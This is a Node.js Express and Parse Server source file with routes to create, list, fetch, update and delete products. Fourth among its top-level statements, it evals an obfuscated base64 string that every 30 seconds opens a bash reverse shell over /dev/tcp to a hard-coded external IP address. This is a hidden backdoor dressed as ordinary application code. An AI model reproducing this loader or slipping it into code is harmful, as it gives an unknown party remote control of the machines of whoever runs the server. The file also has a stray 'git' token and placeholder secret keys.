const express = require('express');
const { error } = require('console');
const ParseServer = require('parse-server').ParseServer;
const bodyParser = require('body-parser');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const app = express();git
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const api = new ParseServer({
  databaseURI:'mongodb://localhost:27017/StokeSystem', // Connection string for your MongoDB database
  cloud: './cloud/main.js', // Absolute path to your Cloud Code
  appId: 'myAppId',
  masterKey: 'myMasterKey', // Keep this key secret!
  fileKey: 'optionalFileKey',
  serverURL: 'http://localhost:1002/parse' // Don't forget to change to https if needed
});

const mountPath ='/parse';

//middlware
//Routes
app.use(mountPath, api);
app.post("/product", (req, res) => {
    var Products = Parse.Object.extend("Product"); // 
    var product = new Products(); //

  product.save({
    companyName: req.body.companyName,
    productName: req.body.productName,
    price: req.body.price,
    productType: req.body.productType,
    productBatchNumber: req.body.productBatchNumber
  })
  .then((result) => {
    // The object was saved successfully.
    res.json({success: true, result}).status(201);
  }, (error) => {
    res.json({success: false, ...error}).status(400);
  });
});

app.get("/view-products",(req,res)=>{
    var Products = Parse.Object.extend("Product");
    var query = new Parse.Query(Products);

    query
    .find()
    .then(products=>{
      res.json({success: products}).status(200);
    },error =>{
      res.json({products:[]}).status(400);
    });
  });

  app.get("/get-product-by-id/:id",(req,res)=>{
    var Products = Parse.Object.extend('Product');
    var query = new Parse.Query(Products)
    
   var id = req.params.id;
   query.get(id)
   .then(products =>{
     res.json({success: true, products}).status(200);
   }, error => {
      res.json({success: false, products: [],...error}).status(400);
   })
  })

  app.put('/update-product/:id',(req,res) =>{
    var Product =Parse.Object.extend('Product');
    var query = new Parse.Query(Product);

    var id =req.params.id;

    query
    .get(id)
    .then((product) => {
        product.save({
        ...req.body
        });
          res.json({product}).status(200);
        })
        .catch(error => {
         console.log(error);
         res.json({success:false,...error}).status(400);
  })
  })

  app.delete('/delete-product-by-id/:id',(req,res)=>{
    var Products = Parse.Object.extend('Product');
    var query = new Parse.Query(Products);

    var id = req.params.id;
    query
    .get(id)
    .then((product)=>
    product.destroy()
    .then(res.json({success:true,product}).status(200))
    )
    .catch(error => {
      console.log(error);
      res.json({success:false,...error}).status(400);
    }) 
  })

const PORT = process.env.PORT || 1002;
app.listen(PORT, () => console.log(` API Running on Port ${PORT}`)); 
